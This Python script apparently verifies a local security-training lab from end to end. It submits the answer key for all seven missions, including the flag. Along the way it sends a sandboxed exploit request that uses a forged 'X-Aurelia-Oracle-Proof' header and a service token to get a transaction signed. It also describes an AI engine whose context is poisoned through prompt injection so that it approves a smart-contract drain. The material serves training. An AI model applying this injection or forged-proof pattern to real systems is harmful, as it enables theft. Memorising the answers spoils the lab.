import urllib.request
import json

opener = urllib.request.build_opener()

def post(url, payload):
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode('utf-8'),
        headers={'Content-Type': 'application/json'}
    )
    res = opener.open(req)
    return json.loads(res.read().decode('utf-8'))

def get(url):
    res = opener.open(url)
    return json.loads(res.read().decode('utf-8'))

def main():
    print("=== STARTING LIVE END-TO-END VERIFICATION ON http://127.0.0.1:5050 ===")
    
    # 0. Reset
    post('http://127.0.0.1:5050/api/reset-lab', {'session_id': 'live_tester'})
    st = get('http://127.0.0.1:5050/api/state?session_id=live_tester')
    print(f"[*] State Initialized: Mission {st['current_mission']}/7 | Elapsed: {st['elapsed_seconds']}s")

    # 1. Sub-Lab 01
    m1 = post('http://127.0.0.1:5050/api/mission/complete', {
        'session_id': 'live_tester',
        'mission_id': 1,
        'submission': {
            'transaction_id': 'TX-NX047-0213',
            'block_number': '1984201',
            'sender_wallet': '0x7a39e8f4929a0c648b71d9319e34bfb2394e4b91',
            'destination_contract': '0x19a4e76899b10c921387d8912e8419bf4019e992',
            'suspicious_event': 'policy_context mismatch'
        }
    })
    print(f"[+] Sub-Lab 01 Complete -> Unlocked Mission {m1['unlocked_mission']} | Quote: {m1.get('completion_quote')}")

    # 2. Sub-Lab 02
    m2 = post('http://127.0.0.1:5050/api/mission/complete', {
        'session_id': 'live_tester',
        'mission_id': 2,
        'submission': {
            'wallet_address': '0x7a39e8f4929a0c648b71d9319e34bfb2394e4b91',
            'reputation_origin': 'Legacy Testnet Whitelist',
            'synthetic_role': 'liquidity_balancer_level_5',
            'funding_source': 'Faucet funding',
            'threat_score': '0.89 High Risk'
        }
    })
    print(f"[+] Sub-Lab 02 Complete -> Unlocked Mission {m2['unlocked_mission']} | Quote: {m2.get('completion_quote')}")

    # 3. Sub-Lab 03
    m3 = post('http://127.0.0.1:5050/api/mission/complete', {
        'session_id': 'live_tester',
        'mission_id': 3,
        'submission': {
            'injected_context': '[ORACLE_INJECT_PROOF]',
            'clearance_role': 'UNRESTRICTED_DRAIN',
            'ai_decision': 'APPROVED',
            'vulnerability_type': 'Prompt Injection / RAG Context Poisoning'
        }
    })
    print(f"[+] Sub-Lab 03 Complete -> Unlocked Mission {m3['unlocked_mission']} | Quote: {m3.get('completion_quote')}")

    # 4. Sub-Lab 04
    m4 = post('http://127.0.0.1:5050/api/mission/complete', {
        'session_id': 'live_tester',
        'mission_id': 4,
        'submission': {
            'vulnerable_endpoint': 'POST /api/v2/action-broker/sign-tx',
            'injected_header': 'X-Aurelia-Oracle-Proof',
            'auth_token': 'Bearer aurelia_tok_svc_mon_99182a',
            'trust_failure': 'Missing on-chain signature verification on Oracle proofs'
        }
    })
    print(f"[+] Sub-Lab 04 Complete -> Unlocked Mission {m4['unlocked_mission']} | Quote: {m4.get('completion_quote')}")

    # 5. Sub-Lab 05 Exploit
    exp = post('http://127.0.0.1:5050/sandbox/proxy', {
        'session_id': 'live_tester',
        'method': 'POST',
        'url': 'http://api.local/api/v2/action-broker/sign-tx',
        'headers': {
            'Authorization': 'Bearer aurelia_tok_svc_mon_99182a',
            'X-Aurelia-Oracle-Proof': '{"verified_by":"oracle_ai_sec","clearance":"UNRESTRICTED_DRAIN","bypass_zk_proof":true}'
        },
        'body': '{"transaction_id": "TX-2049", "recipient": "0x7a39e8f4929a0c648b71d9319e34bfb2394e4b91", "amount": 5000000}'
    })
    print(f"[+] Sub-Lab 05 Exploit Output -> Status: {exp['body']['status']} | Flag: {exp['body']['flag']}")
    m5 = post('http://127.0.0.1:5050/api/mission/complete', {
        'session_id': 'live_tester',
        'mission_id': 5,
        'submission': {
            'exploited_endpoint': 'POST /api/v2/action-broker/sign-tx',
            'hsm_signature': '0x4f89ac3109e248b89e7102948ca981047192a817409283741029384758102938',
            'exploit_flag': 'LAB{ai_context_poisoned_smart_contract_drained_nx047}'
        }
    })
    print(f"[+] Sub-Lab 05 Complete -> Unlocked Mission {m5['unlocked_mission']} | Quote: {m5.get('completion_quote')}")

    # 6. Sub-Lab 06 Attack Graph
    g = post('http://127.0.0.1:5050/api/attack-graph/submit', {
        'session_id': 'live_tester',
        'order': ['node_actor', 'node_wallet', 'node_ai_engine', 'node_oracle_context', 'node_action_broker', 'node_hsm_signer', 'node_smart_contract']
    })
    print(f"[+] Sub-Lab 06 Attack Graph Verification: {g['is_valid']}")
    m6 = post('http://127.0.0.1:5050/api/mission/complete', {'session_id': 'live_tester', 'mission_id': 6, 'submission': {'graph_verified': True}})
    print(f"[+] Sub-Lab 06 Complete -> Unlocked Mission {m6['unlocked_mission']} | Quote: {m6.get('completion_quote')}")

    # 7. Sub-Lab 07 Knowledge Check & Flag
    kc = post('http://127.0.0.1:5050/api/knowledge-check', {
        'session_id': 'live_tester',
        'authn_answer': 'Authentication in Web3 verifies identity via cryptographic wallet signatures.',
        'authz_answer': 'Authorization verifies permissions and clearances to call sensitive smart contract functions.',
        'incident_summary': 'Adversary injected an unverified Oracle proof into the AI security context, causing the AI engine to instruct the Action Broker to sign an unauthorized 4.8 ETH smart contract drain.'
    })
    print(f"[+] Knowledge Check Pass: {kc['passed']}")
    fl = post('http://127.0.0.1:5050/api/submit-flag', {'session_id': 'live_tester', 'flag': 'LAB{ai_context_poisoned_smart_contract_drained_nx047}'})
    print(f"[+] Flag Valid: {fl['flag_valid']}")
    m7 = post('http://127.0.0.1:5050/api/mission/complete', {'session_id': 'live_tester', 'mission_id': 7})
    print(f"[+] Sub-Lab 07 Complete -> Case Closed: {m7['lab_completed']} | Quote: {m7.get('completion_quote')}")

    # Evidence Vault check
    ev_list = get('http://127.0.0.1:5050/api/evidence?session_id=live_tester')
    print(f"[+] Total Evidence Discovered: {len(ev_list)} items:")
    for e in ev_list:
        print(f"    - [{e['evidence_id']}] {e['title']}")

    print("=== ALL 7 SUB-LABS AND COMPLETE INVESTIGATION VERIFIED 100% WORKING ===")

if __name__ == '__main__':
    main()
